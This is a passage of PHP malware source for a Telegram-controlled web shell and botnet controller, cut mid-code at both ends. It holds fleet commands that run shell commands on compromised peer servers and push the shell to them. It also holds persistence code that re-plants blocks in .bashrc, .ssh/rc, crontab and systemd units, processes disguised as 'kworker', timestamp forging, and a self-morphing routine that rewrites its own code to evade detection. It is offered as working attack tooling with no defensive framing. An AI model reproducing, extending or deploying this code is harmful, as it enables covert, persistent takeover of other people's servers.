    if($sub==="rm"){$t=$p[1]??"";if($t===""){wn_send($BOT,$CHAT,"[X] /fleet rm <id>");return;}$s=_fl_load();$b=count($s);$s=array_values(array_filter($s,function($x)use($t){return ($x["id"]??"")!==$t&&($x["url"]??"")!==$t&&($x["label"]??"")!==$t;}));_fl_save($s);wn_send($BOT,$CHAT,"[FLEET] Removed ".($b-count($s)));return;}
    if($sub==="ping"){$s=_fl_load();if(empty($s)){wn_send($BOT,$CHAT,"no peers");return;}$m="FLEET PING\n\n";$upd=array();foreach($s as $x){$r=_fl_request($x["url"]??"","ping",array(),15);if(!empty($r["pong"])){$x["last_status"]="ok";$x["last_seen"]=time();$m.="OK ".($x["label"]??"?")."\n";}else{$x["last_status"]="unreachable";$m.="FAIL ".($x["label"]??"?")."\n";}$upd[]=$x;}_fl_save($upd);wn_send($BOT,$CHAT,$m);return;}
    if($sub==="install"){$t=$p[1]??"";if($t===""){wn_send($BOT,$CHAT,"[X] /fleet install <label>");return;}$s=_fl_load();$x=null;foreach($s as $sv)if(($sv["id"]??"")===$t||($sv["label"]??"")===$t||($sv["url"]??"")===$t){$x=$sv;break;}if(!$x){wn_send($BOT,$CHAT,"[X] not found");return;}$r=_fl_post($x["url"]??"","install_slave",array(),120);wn_send($BOT,$CHAT,!empty($r["install"]["status"])&&$r["install"]["status"]==="success"?"[FLEET] installed ".($x["label"]??"?"):"[X] ".json_encode($r["install"]??$r));return;}
    if($sub==="exec"){$cmd=trim(substr((string)$args,strlen($p[0])));if($cmd===""){wn_send($BOT,$CHAT,"[X] /fleet exec <cmd>");return;}$s=_fl_load();if(empty($s)){wn_send($BOT,$CHAT,"no peers");return;}$m="FLEET EXEC\n$ $cmd\n\n";foreach($s as $x){$r=_fl_request($x["url"]??"","exec",array("cmd"=>$cmd),30);$m.="-- ".($x["label"]??"?")." --\n";$m.=isset($r["output"])?substr((string)$r["output"],0,500):"FAIL ".($r["error"]??"?");$m.="\n\n";}wn_send($BOT,$CHAT,$m);return;}
    if($sub==="cmd"){$t=$p[1]??"";$cmd=trim(substr((string)$args,strlen($p[0])+strlen($t)+2));if($t===""||$cmd===""){wn_send($BOT,$CHAT,"[X] /fleet cmd <label> <cmd>");return;}$s=_fl_load();$x=null;foreach($s as $sv)if(($sv["id"]??"")===$t||($sv["label"]??"")===$t||($sv["url"]??"")===$t){$x=$sv;break;}if(!$x){wn_send($BOT,$CHAT,"[X] not found");return;}$r=_fl_request($x["url"]??"","exec",array("cmd"=>$cmd),30);if(isset($r["output"])){$o=(string)$r["output"];if(strlen($o)>3500)$o=substr($o,0,3500);wn_send($BOT,$CHAT,"[".($x["label"]??"?")."]\n$ $cmd\n\n$o");}else wn_send($BOT,$CHAT,"[X] ".($r["error"]??"?"));return;}
    if($sub==="deploy"){global $SHELL_PATH;$s=_fl_load();if(empty($s)){wn_send($BOT,$CHAT,"no peers");return;}$raw=@_c("fgc",$SHELL_PATH);if($raw===false||strlen($raw)<500){wn_send($BOT,$CHAT,"[X] read fail");return;}$b64=_c("b64e",$raw);$ok=0;$fl=0;$d="";foreach($s as $x){$r=_fl_post($x["url"]??"","deploy_module",array("module_b64"=>$b64),90);if(!empty($r["deployed"])){$ok++;$d.="OK ".($x["label"]??"?")."\n";}else{$fl++;$d.="FAIL ".($x["label"]??"?")."\n";}}wn_send($BOT,$CHAT,"[FLEET] deploy:\n$d\nOK $ok / FAIL $fl");return;}
    wn_send($BOT,$CHAT,"FLEET:\n\n/fleet status\n/fleet key gen|set|rotate\n/fleet add <url> [label]\n/fleet rm <id>\n/fleet ping\n/fleet install <label>\n/fleet exec <cmd>\n/fleet cmd <label> <cmd>\n/fleet deploy");
}

/* ═══ GUARDIAN (part 5 snapshot) ═══ */
function wn_g_key(){global $SECRET,$SHELL,$ROOT;return hash("sha256","guard:".$SECRET.":".$SHELL.":".$ROOT,true);}
function wn_g_paths(){global $__state;$base=".snap_".substr(md5(wn_g_key()."x"),0,12);$h=getenv("HOME")?:"";$p=array();foreach(array($h."/.local/share/icons",$h."/.cache/icons",$h."/.config/icons",$h."/.local/state") as $d){if($d&&is_dir($d)&&is_writable($d))$p[]=$d."/".$base.".dat";}if(isset($__state)&&$__state)$p[]=$__state."/".$base.".dat";$p[]=sys_get_temp_dir()."/".$base.".dat";return array_values(array_unique($p));}
function wn_g_save($l){$k=wn_g_key();$j=json_encode($l);if($j===false)return 0;$s=hash_hmac("sha256",$j,$k,true);$b=$s.$j;$n=0;foreach(wn_g_paths() as $p){$d=dirname($p);if(!is_dir($d))@mkdir($d,0700,true);if(is_dir($d)&&is_writable($d)){if(@_c("fpc",$p,$b,LOCK_EX)!==false){@chmod($p,0600);$n++;}}}return $n;}
function wn_g_load(){static $c=null;if($c!==null)return $c;$k=wn_g_key();$f=false;foreach(wn_g_paths() as $p){if(!file_exists($p))continue;$f=true;$b=_c("fgc",$p);if($b===false||strlen($b)<33)continue;$sig=substr($b,0,32);$j=substr($b,32);if(!hash_equals($sig,hash_hmac("sha256",$j,$k,true)))continue;$l=json_decode($j,true);if(is_array($l))return $c=$l;}return $c=($f?"CORRUPT":null);}
function wn_g_blocks(){$h=getenv("HOME")?:"";return array("bashrc"=>$h."/.bashrc","profile"=>$h."/.profile","bash_profile"=>$h."/.bash_profile","zshrc"=>$h."/.zshrc","bash_logout"=>$h."/.bash_logout","ssh_rc"=>$h."/.ssh/rc","ssh_config"=>$h."/.ssh/config","tmux_conf"=>$h."/.tmux.conf","vimrc"=>$h."/.vimrc","lessfilter"=>$h."/.lessfilter","gitconfig"=>$h."/.gitconfig","xprofile"=>$h."/.xprofile","npmrc"=>$h."/.npmrc");}
function wn_g_extract_block($c,$mp){$ls=explode("\n",$c);$b=array();$in=false;foreach($ls as $l){if(!$in&&stripos($l,$mp)!==false){$in=true;$b[]=$l;continue;}if($in){if(trim($l)==="")break;$b[]=$l;}}return trim(implode("\n",$b));}
function wn_g_capture(){global $HOME,$SHELL_PATH,$BACKUPS,$REPLICA_BACKUPS,$MAIN_WATCHERS,$REPLICA_WATCHERS;$l=array();
    if(trim((string)wn_sh("command -v crontab"))!==""){$c=trim((string)wn_sh("crontab -l"));if($c!==""&&(stripos($c,"php-sess")!==false||stripos($c,"@reboot")!==false))$l["crontab"]=$c;}
    foreach(wn_g_blocks() as $n=>$p){if(!file_exists($p))continue;$c=@_c("fgc",$p);if($c===false)continue;foreach(array("wn_shim_","wn_trap_","wn_vimrc_","wn_tmux_","wn_vimplug_","wn_ses_","wn_ssh_cfg_","t3_shadow_","t3_base_") as $m){if(stripos($c,$m)!==false){$b=wn_g_extract_block($c,$m);if($b!=="")$l["block:".$n]=$b;break;}}}
    if(!empty($HOME)){$ud=$HOME."/.config/systemd/user";foreach((array)glob($ud."/php-*.service") as $s){$c=@_c("fgc",$s);if($c!==false&&$c!=="")$l["systemd:".basename($s)]=$c;}foreach((array)glob($ud."/php-*.timer") as $s){$c=@_c("fgc",$s);if($c!==false&&$c!=="")$l["systemd:".basename($s)]=$c;}}
    return $l;
}
function wn_g_restore($name,$content){global $HOME;
    if($name==="crontab"){if(trim((string)wn_sh("command -v crontab 2>/dev/null"))==="")return false;$cur=trim((string)wn_sh("crontab -l 2>/dev/null"));if($cur===$content)return false;$t=tempnam(sys_get_temp_dir(),"cgt");if(!$t)return false;_c("fpc",$t,$content."\n");wn_sh("crontab ".escapeshellarg($t)." 2>/dev/null");@unlink($t);return true;}
    if(strpos($name,"block:")===0){$bn=substr($name,6);$blocks=wn_g_blocks();if(!isset($blocks[$bn]))return false;$target=$blocks[$bn];if(file_exists($target)){$cur=@_c("fgc",$target);if($cur!==false&&strpos($cur,$content)!==false)return false;if(@_c("fpc",$target,"\n".$content."\n",FILE_APPEND|LOCK_EX)!==false)return true;return false;}$d=dirname($target);if(!is_dir($d))@mkdir($d,0700,true);if(@_c("fpc",$target,$content."\n",LOCK_EX)!==false){@chmod($target,strpos($bn,"ssh_rc")!==false?0600:0644);return true;}return false;}
    if(strpos($name,"systemd:")===0){$u=substr($name,8);$t=$HOME."/.config/systemd/user/".$u;$d=dirname($t);if(!is_dir($d))@mkdir($d,0700,true);if(@_c("fpc",$t,$content,LOCK_EX)!==false){@chmod($t,0600);wn_sh("systemctl --user daemon-reload 2>/dev/null");wn_sh("systemctl --user enable --now ".escapeshellarg($u)." 2>/dev/null");return true;}return false;}
    return false;
}
function wn_guardian($force=false){global $BOT,$CHAT,$__state,$SELF_URL;
    $snap=wn_g_load();$af=(isset($__state)?$__state:sys_get_temp_dir())."/.guardian_alert";$host=(parse_url($SELF_URL,PHP_URL_HOST)?:"?");
    if($snap==="CORRUPT"){$la=file_exists($af)?(int)@_c("fgc",$af):0;if(time()-$la>600){@_c("fpc",$af,(string)time(),LOCK_EX);wn_send($BOT,$CHAT,"[GUARDIAN] Snapshot TAMPERED\nHost: ".$host);}$snap=null;}
    $cur=wn_g_capture();
    if($snap===null){if(count($cur)>=1)wn_g_save($cur);return array();}
    $restored=array();
    foreach($snap as $name=>$content){
        if($name==="crontab"){$live=(string)wn_sh("crontab -l 2>/dev/null");if(stripos($live,"php-sess")===false&&stripos($live,"cleanup.lock")===false){if(wn_g_restore($name,$content))$restored[]="crontab";}continue;}
        if(!isset($cur[$name])){if(wn_g_restore($name,$content))$restored[]=$name;continue;}
        if(strpos($name,"block:")===0){if(stripos($cur[$name],substr($content,0,40))===false){if(wn_g_restore($name,$content))$restored[]=$name;}}
    }
    if(!empty($restored)){$la=file_exists($af)?(int)@_c("fgc",$af):0;if(time()-$la>300){@_c("fpc",$af,(string)time(),LOCK_EX);wn_send($BOT,$CHAT,"[GUARDIAN] Restored:\n".implode("\n",$restored)."\nHost: ".$host);}}
    return $restored;
}

/* ═══ HEALTH SCORE (weighted criticality) ═══ */
function wn_health_watcher(){
    global $SHELL_PATH,$MAIN_WATCHERS,$BACKUPS,$REPLICA_BACKUPS,$__state,$BOT;
    $h=['score'=>0,'matrix'=>[],'warnings'=>[],'bonus'=>[]];
    $W=['shell'=>15,'daemon'=>15,'watchdog'=>10,'cron'=>10,'watchers'=>10,'backups'=>10,'ring'=>5,'p2p'=>5,'stealth'=>5,'integrity'=>5,'hidden'=>5,'polling'=>5];
    $shOk=file_exists($SHELL_PATH);$h['matrix']['shell']=$shOk?$W['shell']:0;if(!$shOk)$h['warnings'][]='shell deleted';
    $dp=(int)@_c("fgc",wn_p("daemon_pid"));$dOk=false;
    if($dp>0){$c=trim((string)@_c("se","ps -p $dp -o args= 2>/dev/null"));if($c!=="")$dOk=true;}
    if(!$dOk){$f=trim((string)@_c("se","pgrep -f '\\.upd_' 2>/dev/null | head -1"));if($f!=="")$dOk=true;}
    $h['matrix']['daemon']=$dOk?$W['daemon']:0;if(!$dOk)$h['warnings'][]='daemon dead';
    $wp=(int)@_c("fgc",wn_p("watchdog_pid"));$wOk=false;
    if($wp>0){$c=trim((string)@_c("se","ps -p $wp -o args= 2>/dev/null"));if($c!=="")$wOk=true;}
    if(!$wOk){$f=trim((string)@_c("se","pgrep -f '\\.tmp_' 2>/dev/null | head -1"));if($f!=="")$wOk=true;}
    $h['matrix']['watchdog']=$wOk?$W['watchdog']:0;if(!$wOk)$h['warnings'][]='watchdog dead';
    $cron=(string)@_c("se","crontab -l 2>/dev/null");$cOk=(stripos($cron,"php-sess")!==false)||(stripos($cron,"cleanup.lock")!==false);$h['matrix']['cron']=$cOk?$W['cron']:0;if(!$cOk)$h['warnings'][]='cron missing';
    $wc=0;foreach($MAIN_WATCHERS as $w)if(file_exists($w))$wc++;$wr=count($MAIN_WATCHERS)>0?$wc/count($MAIN_WATCHERS):0;$h['matrix']['watchers']=(int)round($wr*$W['watchers']);if($wr<1)$h['warnings'][]="watchers $wc/".count($MAIN_WATCHERS);
    $all=array_merge($BACKUPS,$REPLICA_BACKUPS);$bc=0;foreach($all as $b)if(file_exists($b))$bc++;$br=count($all)>0?$bc/count($all):0;$h['matrix']['backups']=(int)round($br*$W['backups']);if($br<1)$h['warnings'][]="backups $bc/".count($all);
    $ringN=0;$rm=function_exists('_fl_key')?'x':'';foreach(['a','b','c'] as $c)if(trim((string)@_c("se","pgrep -f 'kworker/u8:.*".$c."' 2>/dev/null"))!=="")$ringN++;$h['matrix']['ring']=$ringN>0?(int)round(($ringN/3)*$W['ring']):0;
    $fk=_fl_key();if(strlen($fk)>=16){$p2pOk=trim((string)@_c("se","pgrep -f 'kworker/u16:' 2>/dev/null"))!=="";$h['matrix']['p2p']=$p2pOk?$W['p2p']:0;if(!$p2pOk)$h['warnings'][]='p2p dead';}else{$h['matrix']['p2p']=$W['p2p'];}
    $st=file_exists(wn_p("stealth_on"));$h['matrix']['stealth']=$st?$W['stealth']:0;if($st)$h['bonus'][]='stealth';
    $im=(int)@_c("fgc",wn_p("integrity_check"));$h['matrix']['integrity']=$im>0?$W['integrity']:0;
    $hf=$__state."/.wn_hide_state";$hd=file_exists($hf);$h['matrix']['hidden']=$hd?$W['hidden']:0;
    $lv=$__state."/.lv_".substr(md5($BOT),0,8);$ag=file_exists($lv)?time()-filemtime($lv):-1;
    if($ag>=0&&$ag<30)$h['matrix']['polling']=$W['polling'];elseif($ag>=0&&$ag<120)$h['matrix']['polling']=(int)round($W['polling']/2);else $h['matrix']['polling']=0;
    $h['score']=array_sum($h['matrix']);return $h;
}
function _morph_transform($code,$seed){
    if(!function_exists('token_get_all'))return $code;
    $tokens=@token_get_all($code);if(!is_array($tokens)||empty($tokens))return $code;
    $out='';$varMap=[];$style=['minified','verbose','shuffled','hex','mixed'][crc32($seed)%5];
    $wsRange=$style==='minified'?[1,1]:($style==='verbose'?[2,4]:[1,3]);
    foreach($tokens as $t){
        if(is_array($t)){list($id,$txt)=$t;
            if($id===T_COMMENT)$out.='/* '.substr(md5($seed.$txt.mt_rand()),0,24).' */';
            elseif($id===T_DOC_COMMENT)$out.='/** '.substr(md5($seed.$txt),0,32).' */';
            elseif($id===T_WHITESPACE){if(strpos($txt,"\n")!==false)$out.=str_repeat("\n",random_int($wsRange[0],$wsRange[1]));else $out.=' ';}
            elseif($id===T_VARIABLE){if(strpos($txt,'$__')===0){if(!isset($varMap[$txt]))$varMap[$txt]='$__'.substr(md5($seed.':v:'.$txt),0,10);$out.=$varMap[$txt];}else $out.=$txt;}
            elseif($id===T_CONSTANT_ENCAPSED_STRING&&($style==='hex'||($style==='mixed'&&mt_rand(0,9)<3))){
                $q=$txt[0];$inner=substr($txt,1,-1);
                if(($q==='\''||$q==='"')&&preg_match('/^[\x20-\x7e]*$/',$inner)&&strlen($inner)>0&&strlen($inner)<200){
                    $enc='"';for($i=0,$l=strlen($inner);$i<$l;$i++){$c=$inner[$i];if(ctype_alnum($c)||$c==='_'||$c===' ')$enc.=$c;else $enc.='\x'.bin2hex($c);}
                    $out.=$enc.'"';
                }else $out.=$txt;
            }else $out.=$txt;
        }else $out.=$t;
    }
    return $out;
}
function _morph_attempt(){
    global $__state,$BOT,$CHAT;
    $lockF=$__state."/.mlk_".substr(md5("morph:lock:".$BOT),0,8);
    $fp=@fopen($lockF,'c');if(!$fp)return;
    if(!@flock($fp,LOCK_EX|LOCK_NB)){@fclose($fp);return;}
    try{
        $self=__FILE__;$code=(string)@_c("fgc",$self);
        if(strlen($code)<500)return;
        $seed=bin2hex(random_bytes(8));$new=_morph_transform($code,$seed);
        if($new===null||strlen($new)<500||hash('sha256',$new)===hash('sha256',$code))return;
        $tmp=$self.'.tmp.'.getmypid().'.'.time();
        if(@_c("fpc",$tmp,$new)===false)return;
        $php=trim((string)@_c("se","command -v php 2>/dev/null"));
        if($php!==''){$chk=(string)@_c("se",escapeshellarg($php).' -l '.escapeshellarg($tmp).' 2>&1');
            if(stripos($chk,'No syntax errors')===false){@unlink($tmp);return;}}
        @chmod($tmp,0600);
        if(!@rename($tmp,$self)){@unlink($tmp);return;}
        $mFile=$__state."/.mst_".substr(md5("morph:state:".$BOT),0,12).".json";
        $st=file_exists($mFile)?@json_decode((string)@_c("fgc",$mFile),true):null;
        if(!is_array($st))$st=['count'=>0];
        $st['count']=(int)($st['count']??0)+1;$st['last']=time();
        $st['last_hash']=hash('sha256',$new);$st['last_old']=hash('sha256',$code);
        $st['last_seed']=$seed;$st['last_size']=strlen($new);
        @_c("fpc",$mFile,json_encode($st),LOCK_EX);@chmod($mFile,0600);
        if(!empty($CHAT))@wn_send($BOT,$CHAT,"[MORPH] #{$st['count']}\nNew: ".substr($st['last_hash'],0,12)."\nSize: ".strlen($new)."b");
    }finally{@flock($fp,LOCK_UN);@fclose($fp);}
}
function wn_handle_update($u,$BOT,$CHAT,$ROOT,$SHELL,$SHELL_PATH,$SELF_URL,$SECRET,$state,$BACKUPS,$HOME){
global $REPLICA_BACKUPS,$MAIN_WATCHERS,$REPLICA_WATCHERS,$DAEMON_PHP_NAME,$WATCHDOG_PHP_NAME,$EMBEDDED_SHELL_B64,$WATCHDOG_PID_PATH,$DAEMON_PID_PATH;
$text=isset($u["message"]["text"])?trim($u["message"]["text"]):"";$caption=isset($u["message"]["caption"])?trim($u["message"]["caption"]):"";$from=isset($u["message"]["from"]["id"])?$u["message"]["from"]["id"]:"";
if((string)$from!==(string)$CHAT){_dbg("DROP","from=$from");return;}
_dbg("CMD",substr($text?:$caption,0,80));
$__lc_tmp=strtolower(trim($text?:$caption));$__isMonitor=in_array($__lc_tmp,array('/status','/help','/start','/menu','/debug','/list_backups','/uninstall'))||preg_match('#^/(deadman|integrity|fleet)(\s|$)#i',$__lc_tmp);
if(!$__isMonitor)_c("fpc",wn_p("activity"),time());
$putDoc=null;$putArg="";$swarmPut=false;$meshPut=false;
if(isset($u["message"]["document"]["file_id"])){
    if(preg_match("#^/put(?:\\s+(.+))?$#is",$caption,$mm)){$putDoc=$u["message"]["document"];$putArg=isset($mm[1])?trim($mm[1]):"";}
    elseif(preg_match("#^/swarm\\s+put(?:\\s+(.+))?$#is",$caption,$mm)){$putDoc=$u["message"]["document"];$putArg=isset($mm[1])?trim($mm[1]):"";$swarmPut=true;}
    elseif(preg_match("#^/mesh\\s+put(?:\\s+(.+))?$#is",$caption,$mm)){$putDoc=$u["message"]["document"];$putArg=isset($mm[1])?trim($mm[1]):"";$meshPut=true;}
}
if($putDoc===null&&isset($u["message"]["reply_to_message"]["document"]["file_id"])){$replyCap=$text!==""?$text:$caption;if(preg_match("#^/put(?:\\s+(.+))?$#is",$replyCap,$mm)){$putDoc=$u["message"]["reply_to_message"]["document"];$putArg=isset($mm[1])?trim($mm[1]):"";}}
if($putDoc!==null){
    $fname=$putDoc["file_name"]??"upload.bin";$fleetTarget=null;$fleetRealDest=$putArg;
    if(!empty($swarmPut)||!empty($meshPut)){
    $fileId=$putDoc["file_id"];$fsize=$putDoc["file_size"]??0;
    if($fsize>20*1024*1024){wn_send($BOT,$CHAT,"[X] File >20MB");return;}
    if($putArg===''){wn_send($BOT,$CHAT,"[X] Path required");return;}
    $tmp=sys_get_temp_dir().'/put_'.getmypid().'_'.time();
    $bytes=wn_download_file($BOT,$fileId,$tmp);
    if($bytes===false||$bytes<=0){wn_send($BOT,$CHAT,"[X] Download failed");@unlink($tmp);return;}
    if(!empty($swarmPut))swarm_distribute($tmp,$putArg,$BOT,$CHAT);
    else mesh_distribute($tmp,$putArg,$BOT,$CHAT);
    @unlink($tmp);
    return;
}
    if($putArg!==""){$parts=preg_split('/\s+/',$putArg,2);$maybeLabel=$parts[0];$servers=function_exists('_fl_load')?_fl_load():array();foreach($servers as $s){if(($s['label']??'')===$maybeLabel||($s['id']??'')===$maybeLabel||($s['url']??'')===$maybeLabel){$fleetTarget=$s;$fleetRealDest=trim($parts[1]??'')?:('/tmp/'.$fname);break;}}}
    if($fleetTarget!==null){if(!function_exists('_fl_post')){wn_send($BOT,$CHAT,"[X] fleet module not available");return;}$fileId=$putDoc["file_id"];$fsize=$putDoc["file_size"]??0;if($fsize>25*1024*1024){wn_send($BOT,$CHAT,"[X] File too large");return;}$tmp=sys_get_temp_dir().'/fleet_up_'.getmypid().'_'.time();$bytes=wn_download_file($BOT,$fileId,$tmp);if($bytes===false||$bytes<=0){wn_send($BOT,$CHAT,"[X] Download failed");@unlink($tmp);return;}$raw=@file_get_contents($tmp);@unlink($tmp);if($raw===false){wn_send($BOT,$CHAT,"[X] Read failed");return;}$b64=_c('b64e',$raw);$r=_fl_post($fleetTarget['url'],'put_file',['file_b64'=>$b64,'dest'=>$fleetRealDest,'fname'=>$fname],120);if(!empty($r['saved'])){wn_send($BOT,$CHAT,"[FLEET PUT] OK -> ".($fleetTarget['label']??'?')."\n".htmlspecialchars($fname,ENT_QUOTES,"UTF-8")."\n".$r['size']." bytes\n".htmlspecialchars($r['path'],ENT_QUOTES,"UTF-8"));}else{wn_send($BOT,$CHAT,"[FLEET PUT] FAIL\n".($r['error']??'?'));}return;}
    $dest=$putArg;if($dest==="")$dest=$ROOT."/".$fname;elseif(is_dir($dest)||substr($dest,-1)==="/")$dest=rtrim($dest,"/")."/".$fname;$fileId=$putDoc["file_id"];$fsize=$putDoc["file_size"]??0;if($fsize>20*1024*1024)wn_send($BOT,$CHAT,"[X] File too large");else{$oldMtime=0;$isShellPath=($dest===$SHELL_PATH);if($isShellPath){$sm=wn_read_mtime();if($sm>0)$oldMtime=$sm;elseif(file_exists($dest))$oldMtime=@filemtime($dest);}elseif(file_exists($dest))$oldMtime=@filemtime($dest);$bytes=wn_download_file($BOT,$fileId,$dest);if($bytes!==false&&$bytes>0){@chmod($dest,0644);if($oldMtime>0)@touch($dest,$oldMtime,$oldMtime);if($isShellPath)_c("fpc",wn_p("integrity_pause"),time());$suffix="";if($oldMtime>0)$suffix="\nmtime: ".date("Y-m-d H:i:s",$oldMtime)." (preserved)";if($isShellPath){$__pM=round(wn_pause_ttl()/60,1);$suffix.="\n\nIntegrity paused {$__pM} min. Run /install.";}wn_send($BOT,$CHAT,"[OK] Saved\n".htmlspecialchars($fname,ENT_QUOTES,"UTF-8")."\n".$bytes." bytes\n".htmlspecialchars($dest,ENT_QUOTES,"UTF-8").$suffix);}else wn_send($BOT,$CHAT,"[X] Save failed");}return;
}
$editSavePath=null;
if(isset($u["message"]["reply_to_message"]["text"])&&$text!==""){$replyText=$u["message"]["reply_to_message"]["text"];if(preg_match("#^\\[EDIT\\]\\s+(/\\S+)#m",$replyText,$em))$editSavePath=trim($em[1]);}
if($editSavePath!==null){$newContent=$text;if(preg_match("#^/save\\s*\\n?#",$newContent))$newContent=preg_replace("#^/save\\s*\\n?#","",$newContent);if(!file_exists($editSavePath))wn_send($BOT,$CHAT,"[X] Not found");elseif(!is_file($editSavePath))wn_send($BOT,$CHAT,"[X] Not a file");elseif(!is_writable($editSavePath))wn_send($BOT,$CHAT,"[X] Not writable");else{$oldSize=@filesize($editSavePath);$oldMtime=@filemtime($editSavePath);$isShellPath=($editSavePath===$SHELL_PATH);if($isShellPath){$sm=wn_read_mtime();if($sm>0)$oldMtime=$sm;}if(_c("fpc",$editSavePath,$newContent)!==false){if($oldMtime>0)@touch($editSavePath,$oldMtime,$oldMtime);if($isShellPath)_c("fpc",wn_p("integrity_pause"),time());$suffix="";if($isShellPath){$__pM=round(wn_pause_ttl()/60,1);$suffix="\nIntegrity paused {$__pM} min";}wn_send($BOT,$CHAT,"[OK] Saved\n".htmlspecialchars($editSavePath,ENT_QUOTES,"UTF-8")."\n$oldSize -> ".strlen($newContent)." bytes".$suffix);}else wn_send($BOT,$CHAT,"[X] Write failed");}return;}
if($text===""&&$caption==="")return;if($text===""&&$caption!=="")$text=$caption;
$lc=strtolower($text);

/* ===== /UNINSTALL — SELF-KILL ===== */
if($lc==="/uninstall"){
    $__skey_l = hash("sha256","st:".$BOT,true);
    $__offsetFile = $state . "/.of_" . substr(md5($BOT),0,8);
    $__seenFile = $__offsetFile . ".seen";
    $__uid = isset($u["update_id"]) ? (string)$u["update_id"] : "";
    if ($__uid !== "") { wn_sw($__seenFile, $__uid, $__skey_l); wn_sw($__offsetFile, $__uid, $__skey_l); }
    $__cron = (string)_c("se", "crontab -l 2>/dev/null");
    if ($__cron !== "") {
        $__keep = array();
        foreach (explode("\n", $__cron) as $__l) {
            if (stripos($__l, "php-sess") !== false) continue;
            if (stripos($__l, "slave.php") !== false) continue;
            if (stripos($__l, ".upd_") !== false) continue;
            if (stripos($__l, ".tmp_") !== false) continue;
            if (trim($__l) === "") continue;
            $__keep[] = $__l;
        }
        $__tmp = tempnam(sys_get_temp_dir(), "cron_");
        if ($__tmp) { @_c("fpc", $__tmp, implode("\n", $__keep) . "\n"); @_c("se", "crontab " . escapeshellarg($__tmp) . " 2>/dev/null"); @unlink($__tmp); }
    }
    @_c("fpc", wn_p("dying"), (string)time(), LOCK_EX);
    wn_send($BOT,$CHAT,"[UNINSTALL] Cleaning up...\nBot akan berhenti dalam beberapa detik.");
    @_c("se","pkill -9 -f ".escapeshellarg($WATCHDOG_PHP_NAME)." 2>/dev/null");
    @unlink($WATCHDOG_PID_PATH);
    usleep(400000);
    @_c("se","pkill -9 -f ".escapeshellarg($DAEMON_PHP_NAME)." 2>/dev/null");
    @unlink($DAEMON_PID_PATH);
    usleep(400000);
    $__selfPid = getmypid();
    $__otherPids = @_c("se", "pgrep -f 'php-sess-' 2>/dev/null");
    if ($__otherPids) { foreach (explode("\n", trim($__otherPids)) as $__p) { $__p = (int)trim($__p); if ($__p > 0 && $__p !== $__selfPid) @_c("se", "kill -9 " . $__p . " 2>/dev/null"); } }
    foreach ($MAIN_WATCHERS as $__f) @unlink($__f);
    foreach ($REPLICA_WATCHERS as $__f) @unlink($__f);
    foreach ($BACKUPS as $__f) @unlink($__f);
    foreach ($REPLICA_BACKUPS as $__f) @unlink($__f);
    $__wp = dirname(__FILE__) . "/" . $DAEMON_PHP_NAME;
    $__wd = dirname(__FILE__) . "/" . $WATCHDOG_PHP_NAME;
    @unlink($__wp); @unlink($__wd);
    @unlink($state . "/.lv_" . substr(md5($BOT),0,8));
    @unlink($state . "/.lk_" . substr(md5($BOT),0,8));
    @unlink($state . "/.fleet_key");
    @unlink($state . "/.fleet_registry.json");
    wn_send($BOT,$CHAT,"[UNINSTALLED]\nAll processes killed.\nCron removed.\nBot offline.\n\nRecovery: buka web shell → login → Install All.");
    exit(0);
}
if($lc==="/install"||$lc==="/reinstall"){wn_send($BOT,$CHAT,"Reinstalling...");if(!file_exists($SHELL_PATH)){$r=wn_restore_shell();if(!$r["ok"]){wn_send($BOT,$CHAT,"[X] Cannot restore: ".$r["msg"]);return;}wn_send($BOT,$CHAT,"[SELF-HEAL] ".$r["msg"]);}@unlink(wn_p("dying"));$out=wn_tg($SELF_URL."?wn_tg=reinstall&key=".urlencode($SECRET),60);if(!$out||$out==="FORBIDDEN"||strlen($out)<10)wn_send($BOT,$CHAT,"[X] Reinstall gagal.");else wn_send($BOT,$CHAT,substr($out,0,3500));}
elseif($lc==="/restore_self"){if(file_exists($SHELL_PATH))wn_send($BOT,$CHAT,"Shell already exists");else{$r=wn_restore_shell();wn_send($BOT,$CHAT,$r["ok"]?"[OK] ".$r["msg"]:"[X] ".$r["msg"]);}}
elseif($lc==="/heal"){$healed=wn_heal_backups();$bl=array();foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $bk)$bl[]=(file_exists($bk)?"OK ":"MISS ").htmlspecialchars($bk,ENT_QUOTES,"UTF-8");wn_send($BOT,$CHAT,"HEALED: $healed\n\n".implode("\n",$bl));}
elseif($lc==="/replicate"){$n=wn_self_replicate();wn_send($BOT,$CHAT,"[REPLICATE] $n new");}
elseif($lc==="/heal_cron"){$cronNow=wn_sh("crontab -l 2>/dev/null")?:"";if(stripos($cronNow,"php-sess")!==false||stripos($cronNow,"cleanup.lock")!==false)wn_send($BOT,$CHAT,"[OK] Cron present");else{@unlink(wn_p("selfheal"));wn_send($BOT,$CHAT,"[!] Cron missing");}}
elseif($lc==="/list_backups"){$bl=array();foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $bk)$bl[]=(file_exists($bk)?"OK ":"MISS ").htmlspecialchars($bk,ENT_QUOTES,"UTF-8");wn_send($BOT,$CHAT,"BACKUPS:\n".implode("\n",$bl));}
elseif($lc==="/status"){$alive=file_exists($SHELL_PATH);$daemonPid=(int)_c("fgc",wn_p("daemon_pid"));$daemonAlive=false;if($daemonPid>0){$dc=trim((string)wn_sh("ps -p $daemonPid -o args= 2>/dev/null"));if($dc!=="")$daemonAlive=true;}if(!$daemonAlive){$dFound=trim((string)wn_sh("pgrep -f ".escapeshellarg($DAEMON_PHP_NAME)." 2>/dev/null"));if($dFound!==""){$daemonAlive=true;$lines=array_values(array_filter(explode("\n",$dFound)));if(!empty($lines))$daemonPid=(int)$lines[0];}}$wdPid=(int)_c("fgc",wn_p("watchdog_pid"));$wdAlive=false;if($wdPid>0){$dc=trim((string)wn_sh("ps -p $wdPid -o args= 2>/dev/null"));if($dc!=="")$wdAlive=true;}if(!$wdAlive){$wFound=trim((string)wn_sh("pgrep -f ".escapeshellarg($WATCHDOG_PHP_NAME)." 2>/dev/null"));if($wFound!==""){$wdAlive=true;$lines=array_values(array_filter(explode("\n",$wFound)));if(!empty($lines))$wdPid=(int)$lines[0];}}$wCount=0;foreach($MAIN_WATCHERS as $w)if(file_exists($w))$wCount++;$bCount=0;foreach(array_merge($BACKUPS,$REPLICA_BACKUPS) as $b)if(file_exists($b))$bCount++;$lastHb=(int)_c("fgc",wn_p("heartbeat"));$hbAge=$lastHb>0?round((time()-$lastHb)/60,1)."m 